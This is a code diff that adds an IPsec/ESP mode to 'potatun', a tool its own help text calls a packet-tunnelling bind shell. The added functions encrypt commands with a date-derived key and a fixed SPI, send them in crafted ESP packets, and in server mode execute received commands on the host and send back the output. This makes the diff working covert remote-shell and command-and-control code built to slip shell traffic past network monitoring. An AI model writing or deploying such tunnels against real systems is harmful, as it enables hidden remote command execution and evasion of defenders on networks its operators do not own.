@@ -115,6 +115,30 @@ def listenUDP(intface, port):
     o = o + str(chr(pkt[UDP].sport - 60000))
   return str(o)
 
+def throwIPSEC(cmd, ip, port, intface):
+  dt = datetime.today()
+  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
+  sa = SecurityAssociation(ESP, spi=0xc0ffeffe, crypt_algo='AES-CBC', crypt_key=key[-16:].encode('ISO-8859-1'))
+  p = IP(Raw(IP(dst=ip)/TCP(sport=random.randint(50000,60000), dport=int(port))/Raw(cmd)))
+  data = sa.encrypt(p)
+  send(data, iface=str(intface), verbose=True)
+
+def stopIPSEC(x):
+  if IP in x and ESP in x:
+    if x[ESP].spi == 0xc0ffeffe:
+      return True
+    else:
+      return False
+  else:
+    return False
+
+def listenIPSEC(intface):
+  dt = datetime.today()
+  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
+  sa = SecurityAssociation(ESP, spi=0xc0ffeffe, crypt_algo='AES-CBC', crypt_key=key[-16:].encode('ISO-8859-1'))
+  data = sniff(iface=str(intface), filter="ip", stop_filter=stopIPSEC)  
+  return (sa.decrypt(data[len(data)-1][IP])).load.decode('utf-8')
+
 def main(intface, ip, port, mode):
   session = PromptSession()
   our_style = Style.from_dict({
@@ -203,11 +227,31 @@ def main(intface, ip, port, mode):
       time.sleep(1)
       throwSCTP(data, ip, port, intface)
 
+  elif mode == "ipsec-c":
+    while True:
+      try:
+        cmd = session.prompt('# ', style=our_style)
+        throwIPSEC(cmd, ip, port, intface)
+        print(HTML("<ansired><b>" + listenIPSEC(intface) + "</b></ansired>"))
+        time.sleep(1)
+      except KeyboardInterrupt:
+        break
+      except EOFError:
+        break
+    print('Exiting..')
+
+  elif mode == "ipsec-s":
+    while True:
+      cmd = listenIPSEC(intface)
+      data = shellExec(cmd)
+      time.sleep(1)
+      throwIPSEC(data, ip, port, intface)
+
 if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='potatun - an experimental packet tunnelling bind shell.')
   parser.add_argument('-i', type=str, help='send interface (eth0)')
   parser.add_argument('-t', type=str, help='send ip:port (10.10.10.1:443)')
-  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s)')
+  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s, ipsec-c/ipsec-s)')
   args = parser.parse_args()
   if args.i and args.t and args.m:
     print("> Sending/Listening on: " + args.i)
